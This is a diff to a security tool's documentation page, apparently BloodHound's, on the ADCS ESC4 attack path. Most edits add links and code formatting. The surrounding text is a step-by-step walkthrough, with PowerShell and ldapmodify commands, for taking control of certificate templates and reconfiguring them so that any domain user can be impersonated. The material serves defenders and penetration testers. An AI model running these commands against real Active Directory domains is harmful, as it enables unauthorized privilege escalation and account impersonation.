@@ -3,8 +3,9 @@ title: ADCSESC4
 description: "The ADCSESC4 edge indicates that the principal has the privileges to perform the ADCS ESC4 abuse against the target AD domain."
 ---
 
+import ResourceEditionPill from '/snippets/resources/edition-pill.mdx';
 
-<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+<ResourceEditionPill />
 
 
 The principal has permissions to modify the settings on one or more certificate templates, enabling the principal configure the certificate templates for ADCS ESC1 conditions, which allows them to specify an alternate subject name and use the certificate for authentication. They also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup lets the principal modify the certificate templates to allow enrollment as any targeted AD forest user or computer without knowing their credentials, and impersonation of those targets by certificate authentication.
@@ -15,7 +16,7 @@ An attacker may perform this attack in the following steps:
 
 ### Step 0.1: Obtain ownership (WriteOwner only)
 
-If you only have WriteOwner on the affected certificate template, then you need to grant your principal ownership over the template.
+If you only have [WriteOwner](/resources/edges/write-owner) on the affected certificate template, then you need to grant your principal ownership over the template.
 
 #### Windows
 
@@ -71,11 +72,11 @@ After abuse, set the ownership back to previous owner using the second script.
 
 ### Step 0.2: Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)
 
-If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to grant your principal GenericAll over the template.
+If you only have [WriteOwner](/resources/edges/write-owner), [Owns](/resources/edges/owns), or [WriteDacl](/resources/edges/write-dacl) on the affected certificate template, then you need to grant your principal [GenericAll](/resources/edges/generic-all) over the template.
 
 #### Windows
 
-Use the following PowerShell snippet to grant the principal GenericAll on the certificate template:
+Use the following PowerShell snippet to grant the principal [GenericAll](/resources/edges/generic-all) on the certificate template:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -159,9 +160,9 @@ dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target
 
 ### Step 0.3: Make certificate template ESC1 abusable (Linux only)
 
-If you have an GenericAll edge to the CertTemplate node, or if you have just granted yourself GenericAll, then you can use this step from a Linux host to make the template abuseable to ESC1 using Certipy.
+If you have an [GenericAll](/resources/edges/generic-all) edge to the [CertTemplate](/resources/nodes/cert-template) node, or if you have just granted yourself GenericAll, then you can use this step from a Linux host to make the template abuseable to ESC1 using Certipy.
 
-If you do not have GenericAll on the CertTemplate or if you are operation from a Windows host, continue to the next step.
+If you do not have [GenericAll](/resources/edges/generic-all) on the [CertTemplate](/resources/nodes/cert-template) or if you are operation from a Windows host, continue to the next step.
 
 Overwrite the configuration of the certificate template to make it vulnerable to ESC1:
 
@@ -179,11 +180,11 @@ The certificate template is now vulnerable to the ESC1 technique. See [ADCSESC1]
 
 ### Step 1: Ensure the certificate template allows for client authentication
 
-The certificate template allows for client authentication if the CertTemplate node's Authentication Enabled (authenticationenabled) is set to True. In that case, continue to the next step.
+The certificate template allows for client authentication if the [CertTemplate](/resources/nodes/cert-template) node's Authentication Enabled (`authenticationenabled`) is set to True. In that case, continue to the next step.
 
 #### Windows
 
-Use the following PowerShell snippet to check the values of the pKIExtendedKeyUsage and msPKI-Certificate-Application-Policy attributes of the certificate template:
+Use the following PowerShell snippet to check the values of the `pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy` attributes of the certificate template:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -253,7 +254,7 @@ Verify the EKU has been removed using the first PowerShell snippet.
 
 #### Linux
 
-Check the current value of the msPKI-Certificate-Application-Policy and pKIExtendedKeyUsage attribute on the certificate template using ldapsearch and note it down for later:
+Check the current value of the `msPKI-Certificate-Application-Policy` and `pKIExtendedKeyUsage` attribute on the certificate template using ldapsearch and note it down for later:
 
 ```bash
 ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Application-Policy
@@ -279,13 +280,13 @@ echo -e "dn: TEMPLATE-DN\nchangetype: modify\nreplace: ATTRIBUTE\nATTRIBUTE: EKU
 
 ### Step 2: Ensure the certificate template requires enrollee to specify Subject Alternative Name (SAN)
 
-The certificate template requires the enrollee to specify SAN if the CertTemplate node's Enrollee Supplies Subject (enrolleesuppliessubject) is set to True. In that case, continue to the next step.
+The certificate template requires the enrollee to specify SAN if the [CertTemplate](/resources/nodes/cert-template) node's Enrollee Supplies Subject (`enrolleesuppliessubject`) is set to True. In that case, continue to the next step.
 
-The certificate template requires the enrollee to specify SAN if the CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT flag is enabled in the certificate template's msPKI-Certificate-Name-Flag attribute.
+The certificate template requires the enrollee to specify SAN if the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is enabled in the certificate template's `msPKI-Certificate-Name-Flag` attribute.
 
 #### Windows
 
-Use the following PowerShell snippet to check the value of the msPKI-Certificate-Name-Flag attribute of the certificate template and its enabled flags:
+Use the following PowerShell snippet to check the value of the `msPKI-Certificate-Name-Flag` attribute of the certificate template and its enabled flags:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -325,7 +326,7 @@ Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
 }
 ```
 
-Flip the CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT flag:
+Flip the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -348,18 +349,18 @@ $ldap.Close()
 ```
 To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.
 
-Run the first PowerShell snippet again to confirm the CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT flag has been enabled.
+Run the first PowerShell snippet again to confirm the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag has been enabled.
 
 After abuse, remove the flag by running the script that flips the flag once again.
 
 #### Linux
 
-Check the current value of the msPKI-Certificate-Name-Flag attribute on the certificate template using ldapsearch and note it down for later:
+Check the current value of the `msPKI-Certificate-Name-Flag` attribute on the certificate template using ldapsearch and note it down for later:
 
 ```bash
 ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Name-Flag
 ```
-Set the CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT flag as the only enabled flag using ldapmodify:
+Set the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag as the only enabled flag using ldapmodify:
 
 ```bash
 echo -e "dn: TEMPLATE-DN\nchangetype: modify\nreplace: msPKI-Certificate-Name-Flag\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME
@@ -371,13 +372,13 @@ After abuse, set the attribute back to the original value by running the command
 
 ### Step 3: Ensure the certificate template does not require manager approval
 
-The certificate template does not require manager approval if the CertTemplate node's Requires Manager Approval (requiresmanagerapproval) is set to False. In that case, continue to the next step.
+The certificate template does not require manager approval if the [CertTemplate](/resources/nodes/cert-template) node's Requires Manager Approval (`requiresmanagerapproval`) is set to False. In that case, continue to the next step.
 
-The certificate template requires manager approval if the CT\_FLAG\_PEND\_ALL\_REQUESTS flag is enabled in the certificate template's msPKI-Enrollment-Flag attribute.
+The certificate template requires manager approval if the `CT_FLAG_PEND_ALL_REQUESTS` flag is enabled in the certificate template's `msPKI-Enrollment-Flag` attribute.
 
 #### Windows
 
-Use the following PowerShell snippet to check the value of the msPKI-Enrollment-Flag attribute of the certificate template and its enabled flags:
+Use the following PowerShell snippet to check the value of the `msPKI-Enrollment-Flag` attribute of the certificate template and its enabled flags:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -421,7 +422,7 @@ Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
 }
 }
 ```
-Flip the CT\_FLAG\_PEND\_ALL\_REQUESTS flag:
+Flip the `CT_FLAG_PEND_ALL_REQUESTS` flag:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -446,18 +447,18 @@ $ldap.Close()
 
 To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.
 
-Run the first PowerShell snippet again to confirm the CT\_FLAG\_PEND\_ALL\_REQUESTS flag has been enabled.
+Run the first PowerShell snippet again to confirm the `CT_FLAG_PEND_ALL_REQUESTS` flag has been enabled.
 
 After abuse, remove the flag by running the script that flips the flag once again.
 
 #### Linux
 
-Check the current value of the msPKI-Enrollment-Flag attribute on the certificate template using ldapsearch and note it down for later:
+Check the current value of the `msPKI-Enrollment-Flag` attribute on the certificate template using ldapsearch and note it down for later:
 
 ```bash
 ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Enrollment-Flag
 ```
-Remove all flags from msPKI-Enrollment-Flag using ldapmodify:
+Remove all flags from `msPKI-Enrollment-Flag` using ldapmodify:
 
 ```bash
 echo -e "dn: TEMPLATE-DN\nchangetype: modify\nreplace: msPKI-Enrollment-Flag\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME
@@ -468,13 +469,13 @@ After abuse, set the attribute back to the original value by running the command
 
 ### Step 4: Ensure the certificate template does not require authorized signatures
 
-The certificate template does not require authorized signatures if the CertTemplate node's Authorized Signatures Required (authorizedsignatures) is set to 0 or if the Schema Version (schemaversion) is 1. In that case, continue to the next step.
+The certificate template does not require authorized signatures if the [CertTemplate](/resources/nodes/cert-template) node's Authorized Signatures Required (`authorizedsignatures`) is set to 0 or if the Schema Version (`schemaversion`) is 1. In that case, continue to the next step.
 
-The certificate template requires authorized signatures if the certificate template's msPKI-RA-Signature attribute value is more than zero.
+The certificate template requires authorized signatures if the certificate template's `msPKI-RA-Signature` attribute value is more than zero.
 
 #### Windows
 
-Use the following PowerShell snippet to check the value of the msPKI-RA-Signature attribute:
+Use the following PowerShell snippet to check the value of the `msPKI-RA-Signature` attribute:
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
 
@@ -491,7 +492,7 @@ $template = $searcher.FindOne().GetDirectoryEntry()
 Write-Host "msPKI-RA-Signature: $($template.Properties["msPKI-RA-Signature"])"
 $ldap.Close()
 ```
-Set msPKI-RA-Signature to 0:
+Set `msPKI-RA-Signature` to 0:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
@@ -513,19 +514,19 @@ $ldap.Close()
 ```
 To run the LDAP query as another principal, replace DirectoryEntry($ldapPath) with DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword) to specify the credentials of the principal.
 
-Run the first PowerShell snippet again to confirm the msPKI-RA-Signature attribute has been set.
+Run the first PowerShell snippet again to confirm the `msPKI-RA-Signature` attribute has been set.
 
-After abuse, set the msPKI-RA-Signature attribute back to the original value by running PowerShell snippet that sets the value, but with the original value instead of 0.
+After abuse, set the `msPKI-RA-Signature` attribute back to the original value by running PowerShell snippet that sets the value, but with the original value instead of 0.
 
 #### Linux
 
-Check the current value of the msPKI-RA-Signature attribute on the certificate template using ldapsearch and note it down for later:
+Check the current value of the `msPKI-RA-Signature` attribute on the certificate template using ldapsearch and note it down for later:
 
 ```bash
 ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-RA-Signature
 ```
 
-Remove all flags from msPKI-RA-Signature using ldapmodify:
+Remove all flags from `msPKI-RA-Signature` using ldapmodify:
 
 ```bash
 echo -e "dn: TEMPLATE-DN\nchangetype: modify\nreplace: msPKI-RA-Signature\nmsPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME
@@ -548,7 +549,7 @@ If a path is returned, continue to the next step.
 
 #### Windows
 
-Use the following PowerShell snippet to grant the principal Enroll on the certificate template:
+Use the following PowerShell snippet to grant the principal [Enroll](/resources/edges/enroll) on the certificate template:
 
 ```bash
 $templateName = "TemplateName" # Use CN, not display name
